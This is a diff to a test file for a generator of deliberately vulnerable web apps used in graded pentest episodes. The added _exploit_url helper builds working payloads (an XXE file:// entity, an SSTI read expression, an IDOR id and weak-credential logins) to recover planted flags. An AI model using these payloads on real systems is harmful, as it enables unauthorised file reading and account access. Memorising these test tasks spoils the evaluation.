@@ -15,6 +15,7 @@ import urllib.request
 from collections.abc import Mapping
 from pathlib import Path
 
+import pytest
 from cyber_webapp import WebappPack
 from cyber_webapp.codegen import _realize_graph
 from cyber_webapp.vulnerabilities import CATALOG
@@ -58,14 +59,16 @@ def _oracle_shapes(graph: WorldGraph) -> set[str]:
 def test_file_loot_admits_and_forces_file_read_oracle() -> None:
     snap = _admit("file")
     assert "file" in _store_kinds(snap.graph)
-    assert "file_read" in _oracle_shapes(snap.graph)
+    # File loot forces a file-store exploit (read or exec) as the oracle.
+    assert _oracle_shapes(snap.graph) & {"file_read", "code_exec"}
 
 
 def test_db_loot_admits_and_forces_response_leak_oracle() -> None:
     snap = _admit("db")
     assert "kv" in _store_kinds(snap.graph)
     assert "file" not in _store_kinds(snap.graph)
-    assert "file_read" not in _oracle_shapes(snap.graph)
+    # No db world has a file store, so no file-store exploit can be the oracle.
+    assert not (_oracle_shapes(snap.graph) & {"file_read", "code_exec"})
 
 
 def test_loot_shape_is_manifest_selectable() -> None:
@@ -134,20 +137,15 @@ def _path_traversal_target(graph: WorldGraph) -> tuple[str, str, str]:
     params = vuln.attrs["params"]
     assert isinstance(params, Mapping)
     endpoint_id = next(e.dst for e in graph.out_edges(vuln.id, "affects"))
-    flag_path = next(
-        str(n.attrs["key"])
-        for n in graph.by_kind("record")
-        if str(n.attrs.get("key", "")).startswith("/")
-    )
     return (
         str(graph.nodes[endpoint_id].attrs["public_url"]),
         str(params["target_param"]),
-        flag_path,
+        _flag_record_key(graph),  # the flag's path, not a decoy file's
     )
 
 
 def test_path_traversal_episode_recovers_flag(tmp_path: Path) -> None:
-    snap = _admit("file")
+    snap = _admit("file", vuln_kinds={"path_traversal": 1})
     url_path, param, flag_path = _path_traversal_target(snap.graph)
     expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
     pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
@@ -182,11 +180,7 @@ def test_command_injection_episode_recovers_flag(tmp_path: Path) -> None:
     assert isinstance(params, Mapping)
     endpoint_id = next(e.dst for e in snap.graph.out_edges(vuln.id, "affects"))
     url_path = str(snap.graph.nodes[endpoint_id].attrs["public_url"])
-    flag_path = next(
-        str(n.attrs["key"])
-        for n in snap.graph.by_kind("record")
-        if str(n.attrs.get("key", "")).startswith("/")
-    )
+    flag_path = _flag_record_key(snap.graph)
     expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
     pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
 
@@ -207,8 +201,73 @@ def test_command_injection_episode_recovers_flag(tmp_path: Path) -> None:
     assert report.passed, report.episode_result.reason
 
 
+def _flag_record_key(graph: WorldGraph) -> str:
+    for record in graph.by_kind("record"):
+        for edge in graph.out_edges(record.id, "holds"):
+            if graph.nodes[edge.dst].attrs.get("kind") == "flag":
+                return str(record.attrs["key"])
+    raise AssertionError("no record holds the flag")
+
+
+def _exploit_url(kind: str, graph: WorldGraph, base: str) -> str:
+    vuln = next(
+        n for n in graph.by_kind("vulnerability") if n.attrs.get("kind") == kind
+    )
+    params = vuln.attrs["params"]
+    assert isinstance(params, Mapping)
+    endpoint_id = next(e.dst for e in graph.out_edges(vuln.id, "affects"))
+    ep = str(graph.nodes[endpoint_id].attrs["public_url"])
+    if kind == "xxe":
+        path = _flag_record_key(graph)
+        xml = f'<!DOCTYPE x [<!ENTITY e SYSTEM "file://{path}">]><x>&e;</x>'
+        return f"{base}{ep}?{params['target_param']}={urllib.parse.quote(xml)}"
+    if kind == "ssti":
+        expr = '{{ read("' + _flag_record_key(graph) + '") }}'
+        return f"{base}{ep}?{params['target_param']}={urllib.parse.quote(expr)}"
+    if kind == "idor":
+        rid = _flag_record_key(graph)
+        return f"{base}{ep}?{params['target_param']}={urllib.parse.quote(rid)}"
+    # weak_credentials
+    return (
+        f"{base}{ep}?{params['user_param']}={params['weak_user']}"
+        f"&{params['password_param']}={params['weak_password']}"
+    )
+
+
+@pytest.mark.parametrize(
+    ("loot", "kind"),
+    [("file", "xxe"), ("file", "ssti"), ("db", "idor"), ("db", "weak_credentials")],
+)
+def test_fanout_class_episode_recovers_flag(
+    loot: str, kind: str, tmp_path: Path
+) -> None:
+    # Each fan-out class is forced as the oracle and solved by its own real
+    # exploit (XXE entity, SSTI expression, IDOR id, default credentials).
+    snap = _admit(loot, vuln_kinds={kind: 1})
+    expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
+    pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
+
+    svc = EpisodeService(WebappPack(), tmp_path)
+    try:
+        handle = svc.start_episode(snap, pentest.id)
+        base = svc.surface(handle)["base_url"]
+        recovered = (
+            urllib.request.urlopen(_exploit_url(kind, snap.graph, base), timeout=10)
+            .read()
+            .decode()
+        )
+        assert expected in recovered, recovered[:120]
+        (svc.solver_root(handle) / "result.json").write_text(
+            json.dumps({"flag": expected})
+        )
+        report = svc.stop_episode(handle)
+    finally:
+        svc.close()
+    assert report.passed, report.episode_result.reason
+
+
 def test_path_traversal_wrong_path_recovers_nothing(tmp_path: Path) -> None:
-    snap = _admit("file")
+    snap = _admit("file", vuln_kinds={"path_traversal": 1})
     url_path, param, _ = _path_traversal_target(snap.graph)
     pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
 
